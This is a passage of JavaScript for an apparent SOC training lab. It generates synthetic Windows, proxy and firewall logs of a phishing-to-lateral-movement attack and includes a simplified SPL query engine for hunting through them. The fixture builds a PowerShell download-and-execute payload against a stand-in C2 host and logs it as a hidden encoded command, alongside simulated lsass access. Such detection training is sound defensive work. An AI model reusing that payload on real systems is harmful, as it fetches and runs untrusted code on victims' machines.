window.CP = window.CP || {};
CP.labs = CP.labs || [];
CP.labs.push({
  id: "lab-siem-hunt",
  title: "SIEM Threat Hunt: From Phishing Doc to Lateral Movement",
  module: "p2-m3",
  difficulty: "Intermediate",
  minutes: 45,
  skills: ["SPL-style queries", "stats & aggregation", "Sysmon", "proxy logs", "attack chain reconstruction", "MITRE ATT&CK"],
  briefing: `
    <p><b>Scenario:</b> Threat intel reports that a finance-themed phishing campaign is hitting companies in your sector.
    Payloads arrive as macro-enabled Word documents that launch encoded PowerShell, beacon to a low-reputation domain, dump credentials
    and move laterally. No alert has fired yet. Your lead asks you to <b>hunt</b> through this morning's data (2025-10-14, 08:00-12:00)
    in the SIEM and reconstruct the attack chain if it happened here.</p>
    <p><b>Data available (indexes):</b> <code>wineventlog</code> (Windows Security log), <code>sysmon</code> (EventCode 1 process creation,
    10 process access, 11 file create), <code>proxy</code> (web proxy) and <code>firewall</code>.</p>
    <p><b>Query language</b> (a subset of Splunk SPL):</p>
<pre><code>index=sysmon EventCode=1 host=WS-* Image!=*chrome.exe "powershell"
  | stats count, dc(host) as hosts by Image      (aggregations: count, dc, values, min, max, sum, avg)
  | where count &gt; 5 AND hosts=1
  | sort -count | head 10
  | table Image, count, hosts
Other commands: top [N] field, rare field, dedup field, rename a as b, fields f1,f2, tail N
Search terms: field=value (wildcards *), field!=value, NOT term, term OR term, field&gt;N, "free text"</code></pre>
    <div class="callout tip">Hunting workflow: start broad (<code>index=proxy | stats count by dest_domain</code>), look for <i>rare</i> or
    <i>unusual</i> values, then pivot on the host, user or IP you found. Each question has a <b>Hint</b> button with an example query.</div>
    <div class="callout real">These are the exact pivots a SOC analyst runs in Splunk, Sentinel (KQL) or Elastic. The syntax differs; the
    thinking (aggregate, find outliers, pivot, build a timeline) is the same everywhere.</div>
  `,
  render(container, ctx) {
    const esc = ctx.escape;
    container.classList.add("lab-lab-siem-hunt");

    // ======================= DATA =======================
    let seed = 20251014;
    const rnd = () => { seed = (seed * 48271) % 2147483647; return (seed - 1) / 2147483646; };
    const ri = (a, b) => a + Math.floor(rnd() * (b - a + 1));
    const pick = (a) => a[Math.floor(rnd() * a.length)];
    const pad = (n) => String(n).padStart(2, "0");
    const T0 = 8 * 3600, T1 = 12 * 3600;
    const ts = (s) => `2025-10-14 ${pad(Math.floor(s / 3600))}:${pad(Math.floor(s % 3600 / 60))}:${pad(s % 60)}`;

    function b64utf16(str) {
      let bin = "";
      for (let i = 0; i < str.length; i++) { const c = str.charCodeAt(i); bin += String.fromCharCode(c & 255, c >> 8); }
      return btoa(bin);
    }
    const C2 = "cdn-sync-api.example";
    const C2_IP = "203.0.113.66";
    const LURE = "docs-invoice-share.example";
    const DOC = "Invoice_Q3_8841.docm";
    const VIC = { host: "WS-FIN-07", ip: "10.10.20.57", user: "dmorgan" };
    const DROP = "C:\\Users\\dmorgan\\AppData\\Local\\Temp\\updater.exe";
    const PS_PAYLOAD = "$u='https://" + C2 + "/a';$p=\"$env:TEMP\\updater.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p";
    const ENC = b64utf16(PS_PAYLOAD);

    const WS = [
      { host: "WS-FIN-02", ip: "10.10.20.52", user: "kchen" }, VIC, { host: "WS-HR-03", ip: "10.10.30.13", user: "lpark" },
      { host: "WS-ENG-11", ip: "10.10.40.21", user: "tbrooks" }, { host: "WS-ENG-14", ip: "10.10.40.24", user: "mali" },
      { host: "WS-SALES-05", ip: "10.10.50.15", user: "jortiz" }, { host: "WS-IT-01", ip: "10.10.60.11", user: "adm.rsingh" }
    ];
    const SRV = [{ host: "FS-01", ip: "10.10.5.10" }, { host: "SQL-02", ip: "10.10.5.20" }, { host: "DC-01", ip: "10.10.5.5" }, { host: "BKP-01", ip: "10.10.5.30" }];
    const DOMAINS = [["login.sso.example.com", "198.51.100.10"], ["mail.example.com", "198.51.100.11"], ["intranet.corp.example.com", "10.10.5.80"],
      ["news.example.org", "192.0.2.40"], ["cdn.example.net", "192.0.2.41"], ["update.vendor.example", "198.51.100.30"], ["crm.example-saas.com", "198.51.100.44"],
      ["collab.example.com", "198.51.100.12"]];

    const E = [];
    const ev = (t, index, sourcetype, host, f) => { E.push(Object.assign({ _t: t, _time: ts(t), index, sourcetype, host }, f)); };

    // --- normal noise ---
    for (let i = 0; i < 95; i++) { // proxy
      const w = pick(WS), d = pick(DOMAINS);
      ev(ri(T0, T1), "proxy", "proxy:squid", "PROXY-01", { src_ip: w.ip, user: w.user, method: rnd() < 0.8 ? "GET" : "POST", dest_domain: d[0], dest_ip: d[1],
        url: "https://" + d[0] + pick(["/", "/index", "/api/v1/items", "/static/app.js", "/inbox", "/news/today"]), status: pick([200, 200, 200, 200, 304, 302, 404]),
        bytes_out: ri(300, 2500), bytes_in: ri(800, 250000), category: d[0].includes("news") ? "News" : "Business" });
    }
    ev(10 * 3600 + 312, "proxy", "proxy:squid", "PROXY-01", { src_ip: "10.10.30.13", user: "lpark", method: "GET", dest_domain: "recipes.example.net", dest_ip: "192.0.2.77",
      url: "https://recipes.example.net/soup", status: 200, bytes_out: 640, bytes_in: 48211, category: "Food" });
    for (let i = 0; i < 70; i++) { // wineventlog logons
      const r = rnd();
      if (r < 0.45) { const w = pick(WS); const s = pick(SRV.slice(0, 3)); ev(ri(T0, T1), "wineventlog", "WinEventLog:Security", s.host, { EventCode: 4624, LogonType: 3, TargetUserName: w.user, IpAddress: w.ip, WorkstationName: w.host, AuthenticationPackageName: "Kerberos" }); }
      else if (r < 0.65) { const w = pick(WS); ev(ri(T0, T1), "wineventlog", "WinEventLog:Security", w.host, { EventCode: 4624, LogonType: pick([2, 7, 11]), TargetUserName: w.user, IpAddress: "127.0.0.1", WorkstationName: w.host, AuthenticationPackageName: "Negotiate" }); }
      else if (r < 0.8) { const s = pick(SRV.slice(0, 3)); ev(ri(T0, T1), "wineventlog", "WinEventLog:Security", s.host, { EventCode: 4624, LogonType: 3, TargetUserName: "svc_backup", IpAddress: "10.10.5.30", WorkstationName: "BKP-01", AuthenticationPackageName: "Kerberos" }); }
      else if (r < 0.9) { const w = pick(WS); ev(ri(T0, T1), "wineventlog", "WinEventLog:Security", w.host, { EventCode: 4634, LogonType: 3, TargetUserName: w.user }); }
      else { const w = pick(WS); ev(ri(T0, T1), "wineventlog", "WinEventLog:Security", "DC-01", { EventCode: 4625, LogonType: 3, TargetUserName: w.user, IpAddress: w.ip, WorkstationName: w.host, Status: "0xC000006A" }); }
    }
    const PROCS = [["C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\explorer.exe", "\"chrome.exe\" --type=renderer"],
      ["C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "C:\\Windows\\explorer.exe", "\"OUTLOOK.EXE\""],
      ["C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "C:\\Windows\\explorer.exe", "\"WINWORD.EXE\" /n \"C:\\Users\\%u\\Documents\\Budget_2026.docx\""],
      ["C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "C:\\Windows\\explorer.exe", "\"EXCEL.EXE\" \"C:\\Users\\%u\\Documents\\Forecast.xlsx\""],
      ["C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\services.exe", "svchost.exe -k netsvcs -p"],
      ["C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\explorer.exe", "cmd.exe /c ipconfig /all"],
      ["C:\\Users\\%u\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", "C:\\Windows\\explorer.exe", "Teams.exe --system-initiated"],
      ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\svchost.exe", "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\IT\\Scripts\\Get-Inventory.ps1"]];
    for (let i = 0; i < 60; i++) {
      const w = pick(WS); const p = pick(PROCS);
      ev(ri(T0, T1), "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", w.host, { EventCode: 1, User: "CORP\\" + w.user, Image: p[0].replace("%u", w.user), ParentImage: p[1], CommandLine: p[2].replace("%u", w.user), IntegrityLevel: "Medium" });
    }
    for (let i = 0; i < 16; i++) {
      const w = pick(WS);
      const benign = pick([["C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe", "0x1000"], ["C:\\Windows\\System32\\svchost.exe", "0x1000"], ["C:\\Windows\\System32\\wininit.exe", "0x1000"]]);
      ev(ri(T0, T1), "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", w.host, { EventCode: 10, SourceImage: benign[0], TargetImage: "C:\\Windows\\system32\\lsass.exe", GrantedAccess: benign[1], SourceUser: "NT AUTHORITY\\SYSTEM" });
    }
    for (let i = 0; i < 8; i++) {
      const w = pick(WS);
      ev(ri(T0, T1), "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", w.host, { EventCode: 11, Image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", TargetFilename: "C:\\Users\\" + w.user + "\\Downloads\\" + pick(["report.pdf", "agenda.docx", "photo.jpg", "setup_notes.txt"]), User: "CORP\\" + w.user });
    }
    for (let i = 0; i < 60; i++) { // firewall
      const w = pick(WS); const r = rnd();
      if (r < 0.5) { const s = pick(SRV.slice(0, 3)); ev(ri(T0, T1), "firewall", "pan:traffic", "FW-01", { src_ip: w.ip, dest_ip: s.ip, dest_port: pick([445, 88, 389, 53, 443]), action: "allowed", app: "internal", bytes: ri(200, 90000) }); }
      else if (r < 0.85) { const d = pick(DOMAINS.filter((x) => !x[1].startsWith("10."))); ev(ri(T0, T1), "firewall", "pan:traffic", "FW-01", { src_ip: "10.10.1.5", dest_ip: d[1], dest_port: 443, action: "allowed", app: "ssl", bytes: ri(500, 300000) }); }
      else { ev(ri(T0, T1), "firewall", "pan:traffic", "FW-01", { src_ip: pick(["192.0.2.200", "198.51.100.201", "203.0.113.9"]), dest_ip: "10.10.1.1", dest_port: pick([22, 3389, 23, 445]), action: "blocked", app: "not-applicable", bytes: 0 }); }
    }

    // --- the attack chain ---
    const A = 9 * 3600 + 14 * 60 + 2;
    ev(A, "proxy", "proxy:squid", "PROXY-01", { src_ip: VIC.ip, user: VIC.user, method: "GET", dest_domain: LURE, dest_ip: "198.51.100.77", url: "https://" + LURE + "/download/" + DOC, status: 200, bytes_out: 712, bytes_in: 184320, category: "Uncategorized" });
    ev(A + 6, "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", VIC.host, { EventCode: 11, Image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", TargetFilename: "C:\\Users\\dmorgan\\Downloads\\" + DOC, User: "CORP\\dmorgan" });
    ev(A + 123, "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", VIC.host, { EventCode: 1, User: "CORP\\dmorgan", Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", ParentImage: "C:\\Windows\\explorer.exe", CommandLine: "\"WINWORD.EXE\" /n \"C:\\Users\\dmorgan\\Downloads\\" + DOC + "\"", IntegrityLevel: "Medium" });
    ev(A + 139, "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", VIC.host, { EventCode: 1, User: "CORP\\dmorgan", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", CommandLine: "powershell.exe -nop -w hidden -enc " + ENC, IntegrityLevel: "Medium" });
    ev(A + 146, "proxy", "proxy:squid", "PROXY-01", { src_ip: VIC.ip, user: VIC.user, method: "GET", dest_domain: C2, dest_ip: C2_IP, url: "https://" + C2 + "/a", status: 200, bytes_out: 402, bytes_in: 912384, category: "Uncategorized" });
    ev(A + 150, "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", VIC.host, { EventCode: 11, Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", TargetFilename: DROP, User: "CORP\\dmorgan" });
    ev(A + 152, "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", VIC.host, { EventCode: 1, User: "CORP\\dmorgan", Image: DROP, ParentImage: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "\"" + DROP + "\"", IntegrityLevel: "Medium" });
    let bt = A + 200, beacons = 0;
    while (bt < 10 * 3600 + 50 * 60) {
      ev(bt, "proxy", "proxy:squid", "PROXY-01", { src_ip: VIC.ip, user: VIC.user, method: "POST", dest_domain: C2, dest_ip: C2_IP, url: "https://" + C2 + "/api/v2/sync?id=7f3a91c2", status: 200, bytes_out: ri(310, 360), bytes_in: ri(120, 180), category: "Uncategorized" });
      if (beacons % 3 === 0) ev(bt, "firewall", "pan:traffic", "FW-01", { src_ip: "10.10.1.5", dest_ip: C2_IP, dest_port: 443, action: "allowed", app: "ssl", bytes: ri(430, 540) });
      beacons++;
      bt += 60 + ri(-4, 4);
    }
    const C2_COUNT = beacons + 1;
    const L = 9 * 3600 + 42 * 60 + 10;
    ev(L, "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", VIC.host, { EventCode: 10, SourceImage: DROP, TargetImage: "C:\\Windows\\system32\\lsass.exe", GrantedAccess: "0x1010", SourceUser: "CORP\\dmorgan", CallTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|C:\\Windows\\SYSTEM32\\dbghelp.dll+1b5f0|UNKNOWN(00000000004A1F2B)" });
    ev(L + 2, "sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", VIC.host, { EventCode: 10, SourceImage: DROP, TargetImage: "C:\\Windows\\system32\\lsass.exe", GrantedAccess: "0x1410", SourceUser: "CORP\\dmorgan", CallTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|UNKNOWN(00000000004A2210)" });
    const LM = 9 * 3600 + 58 * 60 + 31;
    ev(LM - 4, "wineventlog", "WinEventLog:Security", VIC.host, { EventCode: 4648, SubjectUserName: "dmorgan", TargetUserName: "svc_backup", TargetServerName: "FS-01", ProcessName: DROP });
    [["FS-01", "10.10.5.10", 0], ["SQL-02", "10.10.5.20", 95], ["DC-01", "10.10.5.5", 212]].forEach((s) => {
      ev(LM + s[2] - 1, "firewall", "pan:traffic", "FW-01", { src_ip: VIC.ip, dest_ip: s[1], dest_port: 445, action: "allowed", app: "ms-ds-smb", bytes: ri(4000, 30000) });
      ev(LM + s[2], "wineventlog", "WinEventLog:Security", s[0], { EventCode: 4624, LogonType: 3, TargetUserName: "svc_backup", IpAddress: VIC.ip, WorkstationName: VIC.host, AuthenticationPackageName: "NTLM" });
    });

    E.sort((a, b) => a._t - b._t);
    const HIDDEN = new Set(["_t", "_raw"]);
    E.forEach((e) => {
      e._raw = e._time.replace(" ", "T") + " " + Object.keys(e).filter((k) => !HIDDEN.has(k) && k !== "_time" && k !== "index").map((k) => {
        const v = String(e[k]); return k + "=" + (/[\s"]/.test(v) ? "\"" + v.replace(/"/g, "\\\"") + "\"" : v);
      }).join(" ");
    });

    // ======================= QUERY ENGINE =======================
    class QErr extends Error {}
    const COMMANDS = ["search", "stats", "sort", "head", "tail", "table", "fields", "where", "dedup", "top", "rare", "rename"];

    function splitPipes(q) {
      const segs = []; let cur = "", quote = null;
      for (const c of q) {
        if (quote) { if (c === quote) quote = null; cur += c; }
        else if (c === '"' || c === "'") { quote = c; cur += c; }
        else if (c === "|") { segs.push(cur.trim()); cur = ""; }
        else cur += c;
      }
      if (quote) throw new QErr("Unbalanced quotes: a " + quote + " is never closed.");
      segs.push(cur.trim());
      return segs;
    }
    // split into whitespace tokens, keeping quoted chunks together
    function wsTokens(s) {
      const out = []; let cur = "", quote = null;
      for (const c of s) {
        if (quote) { cur += c; if (c === quote) quote = null; }
        else if (c === '"' || c === "'") { quote = c; cur += c; }
        else if (/\s/.test(c)) { if (cur) out.push(cur); cur = ""; }
        else cur += c;
      }
      if (cur) out.push(cur);
      return out;
    }
    const unq = (s) => (s.length >= 2 && (s[0] === '"' || s[0] === "'") && s[s.length - 1] === s[0]) ? s.slice(1, -1) : s;
    const wildRe = (v) => new RegExp("^" + v.split("*").map((p) => p.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*") + "$", "i");
    const isNum = (v) => v !== "" && v !== null && v !== undefined && !isNaN(Number(v));

    let allFieldNames = null;
    function getField(row, f) {
      if (f in row) return row[f];
      const lf = f.toLowerCase();
      for (const k in row) if (k.toLowerCase() === lf) return row[k];
      return undefined;
    }
    function cmp(a, op, b) {
      if (a === undefined || a === null) return false;
      if (isNum(a) && isNum(b) && op !== "~") {
        const x = Number(a), y = Number(b);
        switch (op) { case "=": case "==": return x === y; case "!=": return x !== y; case ">": return x > y; case "<": return x < y; case ">=": return x >= y; case "<=": return x <= y; }
      }
      const x = String(a).toLowerCase(), y = String(b).toLowerCase();
      switch (op) {
        case "=": case "==": return x === y;
        case "!=": return x !== y;
        case ">": return x > y; case "<": return x < y; case ">=": return x >= y; case "<=": return x <= y;
      }
      return false;
    }

    function parseSearch(s) {
      const toks = wsTokens(s);
      if (toks[0] && toks[0].toLowerCase() === "search") toks.shift();
      // build list of predicates; OR binds tighter than implicit AND
      const terms = [];
      let negate = false, pendingOr = false;
      toks.forEach((tk) => {
        if (tk === "NOT") { negate = !negate; return; }
        if (tk === "AND") return;
        if (tk === "OR") { if (!terms.length) throw new QErr("OR needs a term on its left."); pendingOr = true; return; }
        if (tk.startsWith("(") || tk.endsWith(")") && !/\w\)$/.test(tk)) throw new QErr("Parentheses are not supported in this simplified search. Use OR between terms, e.g. EventCode=1 OR EventCode=10");
        let pred;
        const m = tk.match(/^([A-Za-z_][\w.]*)(!=|>=|<=|=|>|<)(.*)$/);
        if (m && !(tk[0] === '"' || tk[0] === "'")) {
          const field = m[1], op = m[2], raw = unq(m[3]);
          if (raw === "" && op !== "=") throw new QErr(`Missing value after "${field}${op}".`);
          if (field.toLowerCase() === "earliest" || field.toLowerCase() === "latest") { pred = () => true; }
          else if (op === "=" || op === "!=") {
            const re = wildRe(raw);
            pred = op === "=" ? (r) => { const v = getField(r, field); return v !== undefined && re.test(String(v)); }
              : (r) => { const v = getField(r, field); return v !== undefined && !re.test(String(v)); };
          } else pred = (r) => cmp(getField(r, field), op, raw);
        } else {
          const text = unq(tk).toLowerCase();
          if (text.includes("*")) { const re = new RegExp(text.split("*").map((p) => p.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*"), "i"); pred = (r) => re.test(r._raw); }
          else pred = (r) => r._raw.toLowerCase().includes(text);
        }
        if (negate) { const p0 = pred; pred = (r) => !p0(r); negate = false; }
        if (pendingOr) { const prev = terms.pop(); const cur = pred; terms.push((r) => prev(r) || cur(r)); pendingOr = false; }
        else terms.push(pred);
      });
      if (pendingOr) throw new QErr("OR needs a term on its right.");
      if (negate) throw new QErr("NOT needs a term after it.");
      return (r) => terms.every((p) => p(r));
    }

    function argList(s) { return s.split(/[\s,]+/).filter(Boolean); }

    function cmdStats(rows, args) {
      const toks = argList(args);
      if (!toks.length) throw new QErr("stats needs an aggregation, e.g. | stats count by host");
      const aggs = []; let by = [];
      for (let i = 0; i < toks.length; i++) {
        const t = toks[i];
        if (t.toLowerCase() === "by") { by = toks.slice(i + 1); if (!by.length) throw new QErr("stats ... by needs at least one field."); break; }
        if (t.toLowerCase() === "as") { if (!aggs.length || !toks[i + 1]) throw new QErr("'as' must follow an aggregation and be followed by a name."); aggs[aggs.length - 1].name = toks[++i]; continue; }
        const m = t.match(/^(count|dc|distinct_count|values|min|max|sum|avg|mean|first|last|earliest|latest)(?:\(([^)]*)\))?$/i);
        if (!m) throw new QErr(`Unknown stats function "${t}". Use count, dc(field), values(field), min/max/sum/avg(field).`);
        const fn = m[1].toLowerCase(), f = m[2];
        if (fn !== "count" && !f) throw new QErr(`${fn}() needs a field, e.g. ${fn}(src_ip)`);
        aggs.push({ fn, f, name: fn + (f ? "(" + f + ")" : "") });
      }
      const groups = new Map();
      rows.forEach((r) => {
        const keyVals = by.map((f) => getField(r, f));
        if (keyVals.some((v) => v === undefined)) return;
        const key = JSON.stringify(keyVals);
        if (!groups.has(key)) groups.set(key, { keyVals, rows: [] });
        groups.get(key).rows.push(r);
      });
      if (!by.length && !groups.size) groups.set("[]", { keyVals: [], rows: [] });
      const out = [];
      groups.forEach((g) => {
        const o = {};
        by.forEach((f, i) => { o[f] = g.keyVals[i]; });
        aggs.forEach((a) => {
          const vals = a.f ? g.rows.map((r) => getField(r, a.f)).filter((v) => v !== undefined) : null;
          let v;
          switch (a.fn) {
            case "count": v = a.f ? vals.length : g.rows.length; break;
            case "dc": case "distinct_count": v = new Set(vals.map(String)).size; break;
            case "values": v = [...new Set(vals.map(String))].sort().join(", "); break;
            case "min": v = vals.length ? vals.reduce((x, y) => (isNum(x) && isNum(y) ? Number(y) < Number(x) : String(y) < String(x)) ? y : x) : ""; break;
            case "max": v = vals.length ? vals.reduce((x, y) => (isNum(x) && isNum(y) ? Number(y) > Number(x) : String(y) > String(x)) ? y : x) : ""; break;
            case "sum": v = vals.filter(isNum).reduce((x, y) => x + Number(y), 0); break;
            case "avg": case "mean": { const n = vals.filter(isNum); v = n.length ? Math.round(n.reduce((x, y) => x + Number(y), 0) / n.length * 100) / 100 : ""; break; }
            case "first": case "earliest": v = vals.length ? vals[0] : ""; break;
            case "last": case "latest": v = vals.length ? vals[vals.length - 1] : ""; break;
          }
          o[a.name] = v;
        });
        out.push(o);
      });
      out.sort((a, b) => by.map((f) => String(a[f]).localeCompare(String(b[f]), undefined, { numeric: true })).find((x) => x !== 0) || 0);
      return { rows: out, columns: by.concat(aggs.map((a) => a.name)), isEvents: false };
    }
    function cmdSort(res, args) {
      let toks = argList(args);
      let limit = null;
      if (toks[0] && /^\d+$/.test(toks[0])) limit = +toks.shift();
      if (toks[0] && /^limit=\d+$/i.test(toks[0])) limit = +toks.shift().split("=")[1];
      const keys = [];
      for (let i = 0; i < toks.length; i++) {
        let t = toks[i], dir = 1;
        if (t === "-" || t === "+") { dir = t === "-" ? -1 : 1; t = toks[++i]; if (!t) throw new QErr("sort: a field name must follow - or +"); }
        else if (t[0] === "-" || t[0] === "+") { dir = t[0] === "-" ? -1 : 1; t = t.slice(1); }
        if (/^(desc|d)$/i.test(t) && keys.length) { keys[keys.length - 1].dir = -1; continue; }
        keys.push({ f: t, dir });
      }
      if (!keys.length) throw new QErr("sort needs a field, e.g. | sort -count");
      const rows = res.rows.slice().sort((a, b) => {
        for (const k of keys) {
          const x = getField(a, k.f), y = getField(b, k.f);
          if (x === y) continue;
          if (x === undefined) return 1; if (y === undefined) return -1;
          const c = isNum(x) && isNum(y) ? Number(x) - Number(y) : String(x).localeCompare(String(y), undefined, { numeric: true });
          if (c) return c * k.dir;
        }
        return 0;
      });
      return Object.assign({}, res, { rows: limit ? rows.slice(0, limit) : rows });
    }
    function numArg(args, def, name) {
      const t = args.trim().replace(/^limit=/i, "");
      if (!t) return def;
      if (!/^\d+$/.test(t)) throw new QErr(`${name} expects a number, e.g. | ${name} 10`);
      return +t;
    }
    function cmdTable(res, args, name) {
      const cols = argList(args);
      if (!cols.length) throw new QErr(`${name} needs at least one field, e.g. | ${name} _time, host, CommandLine`);
      if (cols[0] === "-") {
        const drop = new Set(cols.slice(1).map((c) => c.toLowerCase()));
        const base = res.columns || defaultCols(res.rows);
        return { rows: res.rows, columns: base.filter((c) => !drop.has(c.toLowerCase())), isEvents: false };
      }
      const rows = res.rows.map((r) => { const o = {}; cols.forEach((c) => { o[c] = getField(r, c); }); return o; });
      return { rows, columns: cols, isEvents: false };
    }
    function parseWhere(expr) {
      const toks = [];
      const re = /\s*("(?:[^"\\]|\\.)*"|'[^']*'|>=|<=|!=|==|=|>|<|\(|\)|,|[^\s=!<>(),"']+)/g;
      let m, last = 0;
      while ((m = re.exec(expr)) !== null) { if (m.index !== last && expr.slice(last, m.index).trim()) throw new QErr("Could not parse where clause near: " + expr.slice(last)); toks.push(m[1]); last = re.lastIndex; }
      if (expr.slice(last).trim()) throw new QErr("Could not parse where clause near: " + expr.slice(last));
      let i = 0;
      const peek = () => toks[i], next = () => toks[i++];
      const operand = () => {
        const t = next();
        if (t === undefined) throw new QErr("where: expression ended unexpectedly.");
        if (t[0] === '"' || t[0] === "'") { const v = t.slice(1, -1); return () => v; }
        if (isNum(t)) return () => t;
        if (/^like$/i.test(t) && peek() === "(") {
          next(); const f = operand(); if (next() !== ",") throw new QErr("like(field, \"pattern%\") expects a comma");
          const p = operand(); if (next() !== ")") throw new QErr("like(...) is missing ')'");
          return (r) => { const pat = String(p(r)); const rx = new RegExp("^" + pat.split("%").map((s) => s.replace(/[.+?^${}()|[\]\\*]/g, "\\$&")).join(".*") + "$", "i"); const v = f(r); return v !== undefined && rx.test(String(v)) ? "__true" : "__false"; };
        }
        return (r) => { const v = getField(r, t); return v === undefined && !allFieldNames.has(t.toLowerCase()) ? t : v; };
      };
      const comparison = () => {
        if (peek() === "NOT" || peek() === "not") { next(); const c = comparison(); return (r) => !c(r); }
        if (peek() === "(") { next(); const e = orExpr(); if (next() !== ")") throw new QErr("where: missing ')'"); return e; }
        const left = operand();
        const op = peek();
        if (!["=", "==", "!=", ">", "<", ">=", "<="].includes(op)) {
          return (r) => { const v = left(r); return v === "__true" ? true : v === "__false" ? false : !!v; };
        }
        next();
        const right = operand();
        return (r) => cmp(left(r), op, right(r));
      };
      const andExpr = () => { let l = comparison(); while (peek() && /^and$/i.test(peek())) { next(); const a = l, b = comparison(); l = (r) => a(r) && b(r); } return l; };
      const orExpr = () => { let l = andExpr(); while (peek() && /^or$/i.test(peek())) { next(); const a = l, b = andExpr(); l = (r) => a(r) || b(r); } return l; };
      if (!toks.length) throw new QErr("where needs an expression, e.g. | where count > 10");
      const fn = orExpr();
      if (i < toks.length) throw new QErr(`where: unexpected "${toks[i]}". Combine conditions with AND / OR.`);
      return fn;
    }
    function cmdTop(res, args, rare) {
      let toks = argList(args), limit = 10;
      toks = toks.filter((t) => { const m = t.match(/^limit=(\d+)$/i); if (m) { limit = +m[1]; return false; } return true; });
      if (toks[0] && /^\d+$/.test(toks[0])) limit = +toks.shift();
      const f = toks[0];
      if (!f) throw new QErr(`${rare ? "rare" : "top"} needs a field, e.g. | ${rare ? "rare" : "top"} dest_domain`);
      const counts = new Map(); let total = 0;
      res.rows.forEach((r) => { const v = getField(r, f); if (v === undefined) return; total++; counts.set(String(v), (counts.get(String(v)) || 0) + 1); });
      let rows = [...counts.entries()].map(([v, c]) => ({ [f]: v, count: c, percent: Math.round(c / total * 10000) / 100 }));
      rows.sort((a, b) => rare ? a.count - b.count : b.count - a.count);
      return { rows: rows.slice(0, limit), columns: [f, "count", "percent"], isEvents: false };
    }

    function defaultCols(rows) {
      const s = new Set();
      rows.slice(0, 200).forEach((r) => Object.keys(r).forEach((k) => { if (!HIDDEN.has(k)) s.add(k); }));
      return [...s];
    }

    function runQuery(q) {
      if (!q.trim()) throw new QErr("Type a search, e.g. index=proxy | stats count by dest_domain");
      const segs = splitPipes(q);
      if (!allFieldNames) { allFieldNames = new Set(); E.forEach((e) => Object.keys(e).forEach((k) => allFieldNames.add(k.toLowerCase()))); }
      const first = segs[0];
      const firstWord = (first.split(/\s+/)[0] || "").toLowerCase();
      if (!first) throw new QErr("The query starts with '|'. Begin with search terms such as index=sysmon.");
      if (COMMANDS.includes(firstWord) && firstWord !== "search") throw new QErr(`A query must start with search terms (e.g. index=sysmon) before "| ${firstWord}".`);
      let res = { rows: E.filter(parseSearch(first)), columns: null, isEvents: true };
      for (let i = 1; i < segs.length; i++) {
        const seg = segs[i];
        if (!seg) throw new QErr("Empty pipeline stage: two '|' in a row or a trailing '|'.");
        const sp = seg.search(/\s/);
        const name = (sp < 0 ? seg : seg.slice(0, sp)).toLowerCase();
        const args = sp < 0 ? "" : seg.slice(sp + 1);
        switch (name) {
          case "search": res = Object.assign({}, res, { rows: res.rows.filter(parseSearch(args)) }); break;
          case "stats": res = cmdStats(res.rows, args); break;
          case "sort": res = cmdSort(res, args); break;
          case "head": res = Object.assign({}, res, { rows: res.rows.slice(0, numArg(args, 10, "head")) }); break;
          case "tail": { const n = numArg(args, 10, "tail"); res = Object.assign({}, res, { rows: n ? res.rows.slice(-n) : [] }); break; }
          case "table": case "fields": res = cmdTable(res, args, name); break;
          case "where": { const fn = parseWhere(args); res = Object.assign({}, res, { rows: res.rows.filter(fn) }); break; }
          case "dedup": {
            const fs = argList(args); if (!fs.length) throw new QErr("dedup needs a field, e.g. | dedup host");
            const seen = new Set();
            res = Object.assign({}, res, { rows: res.rows.filter((r) => { const vals = fs.map((f) => getField(r, f)); if (vals.some((v) => v === undefined)) return false; const k = JSON.stringify(vals); if (seen.has(k)) return false; seen.add(k); return true; }) });
            break;
          }
          case "top": res = cmdTop(res, args, false); break;
          case "rare": res = cmdTop(res, args, true); break;
          case "rename": {
            const toks = argList(args); const pairs = [];
            for (let j = 0; j < toks.length; j += 3) { if (!toks[j + 2] || toks[j + 1].toLowerCase() !== "as") throw new QErr("rename syntax: | rename old as new"); pairs.push([toks[j], toks[j + 2]]); }
            const rows = res.rows.map((r) => { const o = Object.assign({}, r); pairs.forEach(([a, b]) => { const v = getField(o, a); if (v !== undefined) { Object.keys(o).forEach((k) => { if (k.toLowerCase() === a.toLowerCase()) delete o[k]; }); o[b] = v; } }); return o; });
            const cols = res.columns ? res.columns.map((c) => { const p = pairs.find(([a]) => a.toLowerCase() === c.toLowerCase()); return p ? p[1] : c; }) : null;
